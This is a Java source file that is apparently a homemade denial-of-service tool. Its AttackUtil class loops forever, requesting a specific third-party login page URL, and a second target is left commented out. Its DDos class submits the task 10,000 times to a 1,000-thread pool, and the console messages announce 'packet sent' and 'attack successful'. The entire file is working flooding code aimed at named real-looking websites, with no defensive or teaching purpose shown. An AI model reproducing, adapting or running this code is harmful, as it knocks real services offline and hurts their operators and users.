package com.smile.azxx.util;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Created by smile on 2018/5/25.
 */
public class AttackUtil implements Runnable{
    @Override
    public void run() {
        while (true) {
            try {
//                URL url = new URL("http://xyschina.cn/app/index.php?i=1&c=entry&op=login&do=login&m=mohutu");
                URL url = new URL("http://xindinghui.xqx6.cn/pc/index.php?i=1&c=entry&op=login&do=login&m=mohutu");

                URLConnection conn = url.openConnection();
                System.out.println("发包成功！");
                BufferedInputStream bis = new BufferedInputStream(
                        conn.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuffer sb = new StringBuffer();

                if (bis != null) {
                    if ((len = bis.read()) != -1) {
                        sb.append(new String(bytes, 0, len));
                        System.out.println("攻击成功！");
                        bis.close();
                    }
                }
            } catch (MalformedURLException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

        }
    }
}

class DDos {
    public static void main(String[] args) {
        ExecutorService es = Executors.newFixedThreadPool(1000);
        AttackUtil mythread = new AttackUtil();
        Thread thread = new Thread(mythread);
        for (int i = 0; i < 10000; i++) {
            es.execute(thread);
        }
    }
}
